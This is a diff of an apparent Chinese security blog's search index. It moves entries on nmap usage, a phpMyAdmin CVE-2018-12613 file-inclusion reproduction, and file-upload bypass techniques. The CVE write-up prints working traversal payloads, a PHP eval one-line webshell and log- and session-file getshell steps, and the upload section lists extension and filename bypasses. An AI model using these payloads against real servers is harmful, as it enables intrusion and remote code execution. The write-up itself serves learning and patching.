@@ -19,6 +19,33 @@
 ]]></content>
   </entry>
   <entry>
+    <title>工具使用</title>
+    <url>/2021/04/30/Blue/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>功能</p>
+<ul>
+<li>发现主机</li>
+<li>扫描端口</li>
+<li>路由追踪</li>
+</ul>
+<p><strong>常用参数</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发现主机</span><br><span class="line">-sP(Ping扫描) 只进行主机发现，不进行端口扫描，降低被发现</span><br><span class="line">-sL 仅将指定的目标的IP列举出来，不进行主机发现(比如列出网段下的IP)</span><br><span class="line"></span><br><span class="line">端口扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">路由跟踪</span><br><span class="line">-traceroute</span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">-vv 对结果进行详细输出</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>基础操作</p>
+<p>(1)发现主机  -sP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP IP&#x2F;CIDR   nmap -sP</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>blue</category>
+      </categories>
+      <tags>
+        <tag>工具使用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>日志分析</title>
     <url>/2021/04/30/Blue/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>概述：将主机系统安全日志/操作日志、网络设备流量日志、Web应用访问日志、SQL应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。</p>
@@ -246,33 +273,6 @@
       </categories>
       <tags>
         <tag>日志分析</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>工具使用</title>
-    <url>/2021/04/30/Blue/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>功能</p>
-<ul>
-<li>发现主机</li>
-<li>扫描端口</li>
-<li>路由追踪</li>
-</ul>
-<p><strong>常用参数</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">发现主机</span><br><span class="line">-sP(Ping扫描) 只进行主机发现，不进行端口扫描，降低被发现</span><br><span class="line">-sL 仅将指定的目标的IP列举出来，不进行主机发现(比如列出网段下的IP)</span><br><span class="line"></span><br><span class="line">端口扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">路由跟踪</span><br><span class="line">-traceroute</span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">-vv 对结果进行详细输出</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>基础操作</p>
-<p>(1)发现主机  -sP</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP IP&#x2F;CIDR   nmap -sP</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>blue</category>
-      </categories>
-      <tags>
-        <tag>工具使用</tag>
       </tags>
   </entry>
   <entry>
@@ -638,106 +638,6 @@
       </tags>
   </entry>
   <entry>
-    <title>phpmyadmin文件包含漏洞复现（CVE-2018-12613）</title>
-    <url>/2021/05/17/tag/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2018-12613)/</url>
-    <content><![CDATA[<h2 id="phpmyadmin文件包含漏洞复现（CVE-2018-12613）"><a href="#phpmyadmin文件包含漏洞复现（CVE-2018-12613）" class="headerlink" title="phpmyadmin文件包含漏洞复现（CVE-2018-12613）"></a>phpmyadmin文件包含漏洞复现（CVE-2018-12613）</h2><h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h3><p><strong>漏洞编号</strong>：CVE-2018-12613</p>
-<p><strong>漏洞简介</strong>：phpMyAdmin 是一套开源的、基于Web的 MySQL数据库管理工具。其 index.php 中存在一处文件包含逻辑，通过二次编码可以绕过检查，造成任意文件包含漏洞，可获取 webshell。</p>
-<p><strong>影响范围</strong>：phpmyadmin 4.8.0-4.8.2</p>
-<p><strong>运行环境</strong>：winodws+phpstudy集成环境</p>
-<h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>需要先登录 phpmyadmin 并访问主页</p>
-<p>执行payload： <code>index.php?target=db_datadict.php%253f/../../../../../Windows/system.ini</code></p>
-<p>返回如下信息，成功执行文件包含</p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png"></p>
-<h3 id="0x03-漏洞细节"><a href="#0x03-漏洞细节" class="headerlink" title="0x03 漏洞细节"></a>0x03 漏洞细节</h3><p>该漏洞主要问题出现在 index.php 55-63行处，代码审计可知：</p>
-<ul>
-<li>通过 include() 包含 target 参数</li>
-<li>利用正则限制 target参数不能存在index</li>
-<li>限制target为非 back_list 参数值（黑名单是一切骚操作的开始）</li>
-<li>自定义函数 <code>checkPageValidity</code> 为True</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>代码对$target_backlist 的定义在 50-52 行 ，可以发现它的限制是非常少的，只要不是 import.php 和 export.php 就行。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>对于第四个判断  <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code> 的代码在文件 libraries\classes\Core.php 443-476行处：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>一共有5个if判断</strong></p>
-<ul>
-<li>变量 $whitelist 是否为空，为空则引用静态声明的 $gotowhitelist</li>
-<li>是否定义变量 page 且为字符串 返回 True</li>
-<li>$page 存在 $whitelist 中的某个值则返回 True</li>
-<li>$_page 存在 $whitelist 中的某个值则返回 True</li>
-<li>经过 urldecode  函数解码后的 $_page 存在 $whitelist 中的某个值则返回 True</li>
-</ul>
-<p><strong>第一个判断：</strong></p>
-<p>直接将 $gotowhitelist 数组赋给了 $whitelist</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span></span><br><span class="line">				.......</span><br><span class="line">				<span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>第二个判断</strong> 肯定是True，没什么问题跳过。</p>
-<p><strong>第三个判断：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<p>判断$page变量值在 $whitelist 数组中是否存在</p>
-<p><strong>第三个判断：</strong></p>
-<p>严谨的 phpmyadmin的开发团队为了防止 target 值后面跟上了其他参数（出现逻辑上的错误）保证能正常包含文件，又做了一次检查，先进行了一次url解码，然后使用<code>mb_substr</code> 和 <code>mb_strpose</code> 。以 ? 分割，获取前面的字符串做为 $_page 变量值，判断其是否存在 $whitelist 数组中。</p>
-<p>但这里的判断导致其出现了问题：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<p>先对$page 进行了 <strong>url解码</strong>，再利用<strong>？标志</strong> 分割出值进行判断。</p>
-<p>假设我们传入的payload：<code>target=db_sql.php%253f/../../../../etc/passwd</code>  </p>
-<p><code>%253f</code> 是 <code>?</code>  的二次URL编码。$page urldecode后就变成了<code>db_sql.php?/../../../../etc/passwd</code> </p>
-<p>因此index.php 的第四个判断 <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code> 也返回了Ture。</p>
-<p>总结以上的各种逻辑绕过，于是我们通过URL二次编码就直接绕过了它的检测返回 True 并成功的实现了任意文件包含。</p>
-<h3 id="0x04-漏洞Getshell"><a href="#0x04-漏洞Getshell" class="headerlink" title="0x04 漏洞Getshell"></a>0x04 漏洞Getshell</h3><p>目前有三种方式：</p>
-<p><strong>方法一、创建数据库和表，写shell</strong></p>
-<p>1、创建一个 <code>text</code> 数据库，表名为 <code>shell</code> ,将shell写入列名</p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img2.png"></p>
-<p>2、在控制台获取数据库的绝对路径 <code>SELECT @@datadir</code></p>
-<p>其 webshell 的网站相对路径： <code>path/text/shell.frm</code></p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img3.png"></p>
-<p>3、文件包含数据库文件 getshell</p>
-<p>payload： <code>?target=db_datadict.php%253f/../../../Extensions\MySQL5.7.26\data\test\shell.frm</code></p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img4.png"></p>
-<p>成功包含，可以直接写入一句话getshll。</p>
-<p><strong>方法二、开启general_log，日志Getshell</strong></p>
-<p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p>
-<p>查询日志信息： <code>show variables like &#39;%general%&#39;</code></p>
-<p>general_log：日志保存状态</p>
-<p>general_log_file：日志保存路径</p>
-<p>开启日志保存并配置保存路径</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;    -- 打开日志保存</span><br><span class="line">set global general_log_file &#x3D; &quot;E:&#x2F;phpstudy&#x2F;WWW&#x2F;log.php&quot;;  -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接</span><br></pre></td></tr></table></figure>
-
-<p>写webshell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure>
-
-<p><strong>方法三、写入session文件包含webshell（推荐）</strong></p>
-<p>在 SQL 控制台 中执行   <code>select &#39;要执行的代码&#39;</code></p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img5.png"></p>
-<p>其代码操作会存入服务器端的session文件（服务器为了标记用户，对每个访问用户标识了一个唯一session值，并以文件的形式记录用户信息存放在服务器中）。</p>
-<p>一般情况下，session文件存放位置：</p>
-<p><strong>Linux：</strong> /tmp 或 /var/lib/php/session</p>
-<p><strong>Windows：</strong> C:\WINDOWS\Temp</p>
-<p>文件名为   <code>&quot;sess_&quot; + &quot;session值&quot;</code>  ，session值可以通过浏览器的F12 查询 。</p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img6.png"></p>
-<p>但 sesion 文件路径具体情况还是得具体分析，比如集成环境搭建的路径就集成在了独立的环境中。</p>
-<p>例如：我的环境是 phpstudy，其存储路径为：Phpstudy的安装目录下。</p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img7.png"></p>
-<p><strong>PS：SESSION 文件保存的目录由 <code>php.ini</code> 配置文件 <code>session.save_path= xxx</code>  参数设置</strong></p>
-<p>于是通过payload：<code>?target=db_datadict.php%253f/../../../Extensions/tmp/tmp/sess_fgeda0ibfi693iscj1inrs2lvpjg71i7</code></p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img8.png"></p>
-<h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>如果在不影响正常业务的情况下，建议直接更新到最新版。</p>
-<p>该漏洞在发布不久后，官方就立马修复了，通过git changelog 可以查看官方如何修复漏洞的。查看补丁源码，<a href="https://github.com/phpmyadmin/phpmyadmin/commit/d1360f46cef76c5182116eb2b8fdbab1b20e687a">URL链接</a>：</p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img9.png" alt="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png%208.png"></p>
-<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img10.png" alt="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png%209.png"></p>
-<p>其修复方案似乎有点简单粗暴，直接加了个<code>$include= false</code>，跳过了第二次的 $_page检测，仅执行第一次判断 $_page的合法性，因此也无法进入urldecode 的步骤了。</p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>浏览器解析与编码绕过</title>
     <url>/2021/05/25/tag/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h1 id="浏览器解析与编码绕过"><a href="#浏览器解析与编码绕过" class="headerlink" title="浏览器解析与编码绕过"></a>浏览器解析与编码绕过</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前对于编码绕过并没有做过了解，于是每次测试都是先每种编码都试一试，各种绕过payload放进去碰碰运气。直到最近打国赛，因为对编码绕过没有系统认识导致没做出来。于是开始思考，浏览器到底是如果解析编码问题的？</p>
@@ -844,368 +744,103 @@
       </tags>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p><strong>概述</strong>：对用户文件上传的<strong>控制不足</strong>或者<strong>处理缺陷</strong>，导致用户可以越过本身权限向服务器上传<strong>可执行的动态脚本文件</strong>。“文件上传”功能本身没有问题，有问题的是文件上传后，<strong>后端服务器如何处理、解释文件</strong>。</p>
-<h2 id="文件上传攻击的演变"><a href="#文件上传攻击的演变" class="headerlink" title="文件上传攻击的演变"></a>文件上传攻击的演变</h2><ul>
-<li><p>客户端</p>
+    <title>phpmyadmin文件包含漏洞复现（CVE-2018-12613）</title>
+    <url>/2021/05/17/tag/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2018-12613)/</url>
+    <content><![CDATA[<h2 id="phpmyadmin文件包含漏洞复现（CVE-2018-12613）"><a href="#phpmyadmin文件包含漏洞复现（CVE-2018-12613）" class="headerlink" title="phpmyadmin文件包含漏洞复现（CVE-2018-12613）"></a>phpmyadmin文件包含漏洞复现（CVE-2018-12613）</h2><h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h3><p><strong>漏洞编号</strong>：CVE-2018-12613</p>
+<p><strong>漏洞简介</strong>：phpMyAdmin 是一套开源的、基于Web的 MySQL数据库管理工具。其 index.php 中存在一处文件包含逻辑，通过二次编码可以绕过检查，造成任意文件包含漏洞，可获取 webshell。</p>
+<p><strong>影响范围</strong>：phpmyadmin 4.8.0-4.8.2</p>
+<p><strong>运行环境</strong>：winodws+phpstudy集成环境</p>
+<h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>需要先登录 phpmyadmin 并访问主页</p>
+<p>执行payload： <code>index.php?target=db_datadict.php%253f/../../../../../Windows/system.ini</code></p>
+<p>返回如下信息，成功执行文件包含</p>
+<p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png"></p>
+<h3 id="0x03-漏洞细节"><a href="#0x03-漏洞细节" class="headerlink" title="0x03 漏洞细节"></a>0x03 漏洞细节</h3><p>该漏洞主要问题出现在 index.php 55-63行处，代码审计可知：</p>
 <ul>
-<li>前端 JS 校验</li>
+<li>通过 include() 包含 target 参数</li>
+<li>利用正则限制 target参数不能存在index</li>
+<li>限制target为非 back_list 参数值（黑名单是一切骚操作的开始）</li>
+<li>自定义函数 <code>checkPageValidity</code> 为True</li>
 </ul>
-</li>
-<li><p>服务端</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码对$target_backlist 的定义在 50-52 行 ，可以发现它的限制是非常少的，只要不是 import.php 和 export.php 就行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>对于第四个判断  <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code> 的代码在文件 libraries\classes\Core.php 443-476行处：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>一共有5个if判断</strong></p>
 <ul>
-<li>文件后缀校验</li>
-<li>文件类型校验</li>
-<li>文件内容校验</li>
-<li>自定义规则校验</li>
+<li>变量 $whitelist 是否为空，为空则引用静态声明的 $gotowhitelist</li>
+<li>是否定义变量 page 且为字符串 返回 True</li>
+<li>$page 存在 $whitelist 中的某个值则返回 True</li>
+<li>$_page 存在 $whitelist 中的某个值则返回 True</li>
+<li>经过 urldecode  函数解码后的 $_page 存在 $whitelist 中的某个值则返回 True</li>
 </ul>
-</li>
-</ul>
-<p>==================</p>
-<p>文件上传测试点 -图片</p>
-<p>===================</p>
-<h2 id="客户端校验（前端）"><a href="#客户端校验（前端）" class="headerlink" title="客户端校验（前端）"></a>客户端校验（前端）</h2><h3 id="JavaScript检查"><a href="#JavaScript检查" class="headerlink" title="JavaScript检查"></a><strong>JavaScript检查</strong></h3><p>​    方法1：浏览器禁js</p>
-<p>​    方法2：burp抓包 先上传白名单文件，再用burp修改上传文件后缀（一句话木马）</p>
-<h2 id="服务端校验（后端）"><a href="#服务端校验（后端）" class="headerlink" title="服务端校验（后端）"></a>服务端校验（后端）</h2><h3 id="文件后缀校验"><a href="#文件后缀校验" class="headerlink" title="文件后缀校验"></a>文件后缀校验</h3><p><strong>黑名单</strong></p>
-<ul>
-<li>大小写绕过</li>
-<li>非黑名单列表爆破</li>
-<li>特殊文件名绕过</li>
-<li>0x00截断绕过</li>
-<li>配合解析漏洞</li>
-<li>双写绕过</li>
-</ul>
-<p><strong>白名单</strong></p>
-<ul>
-<li>0x00截断绕过</li>
-<li>解析漏洞绕过（1.php.jpg）</li>
-<li>.htaccess文件修改配置</li>
-</ul>
-<p>黑名单：寻找漏网之鱼</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-------------------------------------</span><br><span class="line">(1)文件名大小写绕过:Asp Php PHp等等</span><br><span class="line">   只适合windos系统(对大小写不敏感)</span><br><span class="line"></span><br><span class="line"> ### Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。</span><br><span class="line"> ### Linux系统下 test.php和 TesT.php不一样。</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line">(2)非黑名单列表绕过</span><br><span class="line">jsp jspx jspf jspa jsw jsv jtml</span><br><span class="line">asp asa asax cer cdx aspx ascx ashx asmx asp&#123;80-90&#125;</span><br><span class="line">php php1 php2 php3 php4 php5 phtml phtm phps phpt php345 shtml pwml phtm</span><br><span class="line">exe exee vbs asis</span><br><span class="line">inc sh reg cgi exe dll com bat pl cfc cfm ini 等。</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line">(3)系统命名绕过</span><br><span class="line">###利用不符合 windows 系统的格式，但 windows 会自动去除的特性</span><br><span class="line">test.php.			</span><br><span class="line">test.php_(下划线)     </span><br><span class="line">test.php (有空格)     对于文件名中空格会被作为空处理，代码不会删除</span><br><span class="line">php:1.jpg</span><br><span class="line">php::$DATA  # ::$data被当作文件流处理，最后只保留::$DATA之前的文件名以及后缀</span><br></pre></td></tr></table></figure>
+<p><strong>第一个判断：</strong></p>
+<p>直接将 $gotowhitelist 数组赋给了 $whitelist</p>
